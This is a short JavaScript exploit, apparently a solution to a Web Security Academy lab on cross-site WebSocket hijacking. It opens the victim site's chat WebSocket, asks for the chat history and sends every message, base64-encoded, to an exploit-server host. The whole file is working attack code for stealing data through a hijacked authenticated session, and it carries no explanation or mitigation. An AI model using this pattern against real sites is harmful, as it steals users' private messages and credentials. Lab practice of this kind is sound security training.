var webSocket = new WebSocket("wss://0a0200d1034484708145fc57004a00bc.web-security-academy.net/chat");

webSocket.onopen = function (evt) {
    webSocket.send("READY");
};

webSocket.onmessage = function (evt) {
    var message = evt.data;
   fetch("https://exploit-0adc00b2038684f981f4fb39016600b3.exploit-server.net/exploit?message=" + btoa(message));
}
  